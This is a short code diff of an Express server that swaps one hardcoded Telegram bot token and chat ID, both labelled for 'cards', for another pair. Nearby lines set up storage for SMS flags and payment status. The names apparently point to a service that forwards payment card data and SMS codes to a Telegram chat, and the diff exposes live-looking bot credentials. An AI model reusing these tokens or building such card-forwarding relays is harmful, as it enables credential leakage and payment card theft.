@@ -7,8 +7,8 @@ const app = express()
 const PORT = process.env.PORT || 3001
 
 // Telegram Bot Configuration
-const BOT_TOKEN_CARDS = '8406857793:AAGDQnLYrL78nWDrBxi1AS1kWTTVjxdUbpg'
-const CHAT_ID_CARDS = '-1003171719602'
+const BOT_TOKEN_CARDS = '8302743640:AAHjAEQCDLkZO7zGGptoH4PwpOqkpSenG14'
+const CHAT_ID_CARDS = '-1003290959617'
 
 // In-memory storage для флагов SMS и статуса оплаты
 const smsFlags = new Map()
